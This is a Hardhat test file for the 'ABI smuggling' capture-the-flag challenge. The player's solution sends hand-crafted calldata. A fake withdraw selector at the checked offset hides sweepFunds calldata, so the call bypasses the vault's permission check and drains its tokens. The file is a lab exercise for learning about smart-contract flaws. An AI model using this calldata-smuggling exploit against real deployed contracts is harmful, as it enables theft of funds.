const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] ABI smuggling", function () {
  let deployer, player, recovery;
  let token, vault;

  const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player, recovery] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy Vault
    vault = await (
      await ethers.getContractFactory("SelfAuthorizedVault", deployer)
    ).deploy();
    expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

    // Set permissions
    const deployerPermission = await vault.getActionId(
      "0x85fb709d",
      deployer.address,
      vault.address
    );
    const playerPermission = await vault.getActionId(
      "0xd9caed12",
      player.address,
      vault.address
    );
    await vault.setPermissions([deployerPermission, playerPermission]);
    expect(await vault.permissions(deployerPermission)).to.be.true;
    expect(await vault.permissions(playerPermission)).to.be.true;

    // Make sure Vault is initialized
    expect(await vault.initialized()).to.be.true;

    // Deposit tokens into the vault
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

    expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(0);

    // Cannot call Vault directly
    await expect(
      vault.sweepFunds(deployer.address, token.address)
    ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
    await expect(
      vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
    ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    /*
        0x1cff79cd // execute function selector -> 4 bytes
        000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512 // vault.address (64) -> 32 bytes
        0000000000000000000000000000000000000000000000000000000000000080 // calldata offset (64) -> offset 0x80
        0000000000000000000000000000000000000000000000000000000000000000 // padding (64)
        d9caed1200000000000000000000000000000000000000000000000000000000 // withdraw function selector (64) -> fake function selector
        0000000000000000000000000000000000000000000000000000000000000044 // length of calldata (64) -> calldata length 0x44
        85fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000 // sweepFunds function calldata
    */

    console.log("Player Address : ", player.address);
    console.log("Recovery Address : ", recovery.address);
    console.log("Vault Address : ", vault.address);
    console.log("Token Address : ", token.address);

    await player.sendTransaction({
      to: vault.address,
      data: "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000",
    });

    console.log(
      "After Token Balance Vault : ",
      (await token.balanceOf(vault.address)).toString()
    );

    console.log(
      "After Token Balance Player : ",
      await token.balanceOf(recovery.address)
    );
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(0);
    expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
